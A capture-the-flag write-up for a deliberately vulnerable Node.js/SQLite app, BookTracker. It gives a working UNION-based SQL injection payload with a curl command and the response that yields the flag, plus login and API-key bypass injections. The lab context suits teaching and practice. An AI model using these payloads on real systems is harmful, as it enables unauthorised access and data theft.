# BookTracker SQL Injection Challenge Write-Up

## Objective
The goal of this challenge is to exploit a SQL injection vulnerability in the BookTracker application to retrieve the hidden CTF flag. Based on the documentation, we know the flag is stored in the `admin_secrets` table under the key `FLAG`.

---

## 1. Reconnaissance
The application is built using Node.js, Express, and SQLite. Every database query in the backend is constructed using raw string concatenation, making the entire application vulnerable to various forms of SQL injection.

While there are over 20 distinct vulnerabilities in this educational application, the most straightforward approach for data exfiltration is **UNION-based SQL Injection**.

The search endpoint `GET /api/search?q=` is unauthenticated and vulnerable. The underlying query looks like this:
```sql
SELECT id, book_title, author, progress_percentage, user_id
FROM reading_progress
WHERE book_title LIKE '%<USER_INPUT>%' OR author LIKE '%<USER_INPUT>%'
```

---

## 2. Exploitation: UNION-Based Injection
To use a UNION-based injection, our injected query must return the exact same number of columns as the original query. The original query selects 5 columns: `id`, `book_title`, `author`, `progress_percentage`, and `user_id`.

### Step 2.1: Bypassing the Original Query
We inject a single quote `'` to break out of the `LIKE` clause string, followed by the `UNION SELECT` statement. Finally, we append `--` to comment out the rest of the original query (the trailing `%'`).

### Step 2.2: Extracting the Flag
We know the target table is `admin_secrets` and it contains columns like `id`, `key`, and `value`.
We will craft our `UNION SELECT` to fetch `id`, `key`, and `value`. To match the required 5 columns of the original query, we pad the remaining 2 columns with placeholder strings (e.g., `'x'` and `'y'`).

**Payload:**
```text
' UNION SELECT id, key, value, 'x', 'y' FROM admin_secrets--
```

**Full Exploit Command:**
```bash
curl "http://localhost:3000/api/search?q=' UNION SELECT id,key,value,'x','y' FROM admin_secrets--"
```

### Response
The application executes the query and returns the results. Within the JSON response, you will find the hidden secrets, including the flag:

```json
[
  ...
  {
    "id": 1,
    "book_title": "FLAG",
    "author": "CTF{sql_injection_master_2025}",
    "progress_percentage": "x",
    "user_id": "y"
  },
  ...
]
```

**Flag:** `CTF{sql_injection_master_2025}`

---

## Alternative Method: Authentication Bypass + Bonus Endpoint
If you prefer full database access, you can bypass the admin login first:

1. **Auth Bypass:**
   ```bash
   curl -X POST http://localhost:3000/login -d "username=admin'--&password=anything"
   ```
   *This logs you in as `admin`, allowing you to extract the admin API key from the dashboard or profile.*

2. **Raw SQL Execution:**
   The application features a bonus endpoint (`POST /api/admin/query`) for raw SQL execution. You can bypass the API key check via injection:
   ```bash
   curl -X POST http://localhost:3000/api/admin/query \
     -H "Content-Type: application/json" \
     -d '{"api_key":"'\'' OR '\''1'\''='\''1","query":"SELECT * FROM admin_secrets"}'
   ```
   This will directly dump the contents of the `admin_secrets` table, securing the flag.
